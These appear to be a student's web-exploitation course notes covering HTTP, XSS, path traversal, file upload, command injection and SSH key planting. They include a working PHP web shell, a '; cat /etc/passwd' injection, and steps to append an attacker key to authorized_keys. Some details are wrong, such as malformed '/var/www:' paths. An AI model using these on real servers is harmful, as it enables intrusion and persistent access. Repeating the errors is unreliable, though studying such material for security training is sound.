###############################################################################################################################################################################

                                                                                #Web Exploitation#

###############################################################################################################################################################################

#Server/Client Relationship
    #Synchronous communications between user and services
    #Not all data is not returned, client only receives what is allowed

#HTTP
    #Admin ("Head Honcho") of web page
          www-data
    #Request/Response 
        #Various tools to view
            #tcpdump
            #wireshark
            #Developer Console
    #Methods
        #A select few
            GET          (Server to client)
            POST         (Client to server)
            HEAD         
            PUT
            https://tools.ietf.org/html/rfc2616
    #Response Codes
        10x                    #Informational
        2XX                    #Success
        30X                    #Redirection
        4XX                    #Client Error
        5XX                    #Server Error
        https://tools.ietf.org/html/rfc2616
    #Fields
        User-Agent              #Can find info about what browser is being used
        Referer                 #Can see what sent to current website
        Cookie
        Date
        Server
        Set-Cookie
    #Tools can use to get info
        wget 
        curl

#JavaScript

#Cross-Site Scripting (XSS)
    #Insertion of arbitrary code into a web page, that executes in the browser of visitors
        #Unsanitized GET,POST,PUT methods allow JS to be placed on websites
        #Often found in forums that allow HTML
    #Reflected XSS
        #Most Common form of XSS
        #Transient, occurs in error messages or search results
        #Delivered through intermidafe media, such as a link in an email
        #Characters normally illegal in urls can be base64 encoded
        #not persistant, often within url
    #Stored XSS
        #Resides on vulnerable site
        #Only requires user to visit page

#Server Side Injection
    #Directory Traversal/Path Traversal
        #vulnerabilities exist when an attacker is able to read files on a web server that are outside of the intended scope by the developers
        #gives an attacker arbitrary read of any file that the web server process has read permission for
        #Ability to read/execute outside web serverâ€™s directory
        #Uses ../../ (relative paths) in manipulating a server-side file path
            ../../<file you want>
                #throw  a bunch of ../ to not have to worry about guessing right amount
    #Malicious File Upload
        #Site Allows unsanitized file uploads
        #Server Don't validate extension or size
        #allows for code execution
        #once uploadsed
            #find your file
            #call your file
        #java script to run a cmd and be able to use web page as a cmd prompt
              <HTML><BODY>
              <FORM METHOD="GET" NAME="myform" ACTION="">
              <INPUT TYPE="text" NAME="cmd">
              <INPUT TYPE="submit" VALUE="Send">
              </FORM>
              <pre>
              <?php
              if($_GET['cmd']) {
                system($_GET['cmd']);
                }
              ?>
              </pre>
              </BODY></HTML>
    #Command Injection
        #Application on the server is vulnerable
            #allowing execution of arbitrary commands
        #user input is not validated
            #common example is SOHO router, with a web page to allow ping
        #need a ; before command to make it work
    #SSH Key Upload
        #Through either malicious upload or command injection, we can potentially upload our ssh key onto the target system
            #with that we can gain access without the need of a password
        #Run the ssh key gen command on ops-station. When prompted for location to save just press enter to leave default, you can press enter for password as well
            ssh-keygen -t rsa
        #After generating ssh key look for public key in your .ssh folder. Your public key will have .pub as the extension
            cat ~/.ssh/id_rsa.pub
        #On the target website we need to do some tasks in order to upload our ssh properly
            #These commands can be ran from a place where command injection is possible or if you uploaded some malicious php they can be done from there
            whoami
                #Once the user is known find this users home folder by looking in /etc/passwd
                ; cat /etc/passwd
                #We also want to make sure the user has a login shell
            www-data:x:33:33:www-data:/var/www:/bin/bash
            #Check to see if .ssh folder is in the users home directory. If not make it
                ls -la /users/home/directory      #check if .ssh exists
                    ls -la /var/www:
                mkdir /users/home/directory/.ssh  #make .ssh in users home folder if it does not exist
                    mkdir /var/www:/.ssh
            #Echo ssh key to the authorized_keys file in the users .ssh folder
                echo "your_public_key_here" >> /users/home/directory/.ssh/authorized_keys
                    echo "the shit" >> /var/www:/.ssh/authorized_keys
            #Verify key has been uploaded successfully
                cat /users/home/directory/.ssh/authorized_keys
                  cat /var/www:/.ssh/authorized_keys



